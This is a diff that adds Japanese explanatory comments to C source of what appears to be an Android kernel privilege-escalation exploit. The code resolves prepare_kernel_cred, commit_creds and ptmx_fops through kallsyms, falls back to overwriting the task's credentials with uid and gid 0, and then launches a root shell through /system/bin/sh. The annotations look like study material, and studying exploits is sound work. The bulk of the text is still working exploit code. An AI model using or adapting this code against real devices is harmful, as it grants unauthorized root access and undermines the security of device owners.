@@ -137,6 +137,7 @@ obtain_root_privilege_by_modify_task_cred(void)
     return;
   }
 
+// "uid = 0" = root
   cred->uid = 0;
   cred->gid = 0;
   cred->suid = 0;
@@ -200,7 +201,7 @@ run_obtain_root_privilege(void *user_data)
   if (getuid() != 0) {
     printf("commit_creds(): failed. Try to hack task->cred.\n");
 
-    obtain_root_privilege_func = obtain_root_privilege_by_modify_task_cred;
+    obtain_root_privilege_func = obtain_root_privilege_by_modify_task_cred; // SELinuxが有効の場合
     ret = fsync(fd);
   }
 
@@ -257,6 +258,7 @@ find_ptmx_fops_address(kallsyms *info, void *mem, size_t length)
   return setup_ptmx_fops_address_in_memory(mem, length, &hint);
 }
 
+/* シンボルアドレスの探索ここから */
 bool find_variables_in_memory(void *mem, size_t length)
 {
   kallsyms *info;
@@ -268,15 +270,15 @@ bool find_variables_in_memory(void *mem, size_t length)
     printf("Using kallsyms_in_memroy...\n");
 
     if (!prepare_kernel_cred) {
-      prepare_kernel_cred = (prepare_kernel_cred_t)kallsyms_in_memory_lookup_name(info, "prepare_kernel_cred");
+      prepare_kernel_cred = (prepare_kernel_cred_t)kallsyms_in_memory_lookup_name(info, "prepare_kernel_cred"); // kallsymsからprepare_kernel_credのシンボルネームを基にアドレスを探す
     }
 
     if (!commit_creds) {
-      commit_creds = (commit_creds_t)kallsyms_in_memory_lookup_name(info, "commit_creds");
+      commit_creds = (commit_creds_t)kallsyms_in_memory_lookup_name(info, "commit_creds"); // kallsymsからcommit_credsのシンボルネームを基にアドレスを探す
     }
 
     if (!ptmx_fops) {
-      ptmx_fops = (void *)kallsyms_in_memory_lookup_name(info, "ptmx_fops");
+      ptmx_fops = (void *)kallsyms_in_memory_lookup_name(info, "ptmx_fops"); // kallsymsからptmx_fopsのシンボルネームを基にアドレスを探す
 
       if (!ptmx_fops) {
         find_ptmx_fops_address(info, mem, length);
@@ -286,7 +288,7 @@ bool find_variables_in_memory(void *mem, size_t length)
     kallsyms_in_memory_free(info);
 
     if (prepare_kernel_cred && commit_creds && ptmx_fops) {
-      return true;
+      return true; //アドレスを検出
     }
   }
 
@@ -295,6 +297,7 @@ bool find_variables_in_memory(void *mem, size_t length)
 
   return prepare_kernel_cred && commit_creds && ptmx_fops;
 }
+/* シンボルアドレスの探索ここまで */
 
 bool
 setup_variables(void)
@@ -314,14 +317,14 @@ setup_variables(void)
   }
 
   if (prepare_kernel_cred && commit_creds && ptmx_fops) {
-    printf("  prepare_kernel_cred = %p\n", prepare_kernel_cred);
-    printf("  commit_creds = %p\n", commit_creds);
-    printf("  ptmx_fops = %p\n", ptmx_fops);
+    printf("  prepare_kernel_cred = %p\n", prepare_kernel_cred); // prepare_kernel_credのアドレスを表示
+    printf("  commit_creds = %p\n", commit_creds); // commit_credsのアドレスを表示
+    printf("  ptmx_fops = %p\n", ptmx_fops); // ptmx_fopsのアドレスを表示
 
 #ifdef HAS_SET_SYMBOL_ADDRESS
     device_set_symbol_address(DEVICE_SYMBOL(prepare_kernel_cred), (unsigned long int)prepare_kernel_cred);
-    device_set_symbol_address(DEVICE_SYMBOL(commit_creds), (unsigned long int)commit_creds);
-    device_set_symbol_address(DEVICE_SYMBOL(ptmx_fops), (unsigned long int)ptmx_fops);
+    device_set_symbol_address(DEVICE_SYMBOL(commit_creds), (unsigned long int)commit_creds); //commit_credsのシンボルアドレス
+    device_set_symbol_address(DEVICE_SYMBOL(ptmx_fops), (unsigned long int)ptmx_fops); //ptmx_fopsのシンボルアドレス
 #endif /* HAS_SET_SYMBOL_ADDRESS */
 
     return true;
@@ -361,20 +364,20 @@ main(int argc, char **argv)
 
   if (!setup_variables()) {
     printf("Failed to setup variables.\n");
-    exit(EXIT_FAILURE);
+    exit(EXIT_FAILURE); // アドレス情報が検出不可なので処理を終了
   }
 
-  run_exploit();
+  run_exploit(); // exploitの実行を試みる
 
   if (getuid() != 0) {
     printf("Failed to obtain root privilege.\n");
-    exit(EXIT_FAILURE);
+    exit(EXIT_FAILURE); // UIDが0以外(rootではない)なので処理を終了
   }
 
   if (command == NULL) {
-    system("/system/bin/sh");
+    system("/system/bin/sh"); //　特権の取得に成功！
   } else {
-    execl("/system/bin/sh", "/system/bin/sh", "-c", command, NULL);
+    execl("/system/bin/sh", "/system/bin/sh", "-c", command, NULL);　//　特権の取得に成功！
   }
 
   exit(EXIT_SUCCESS);
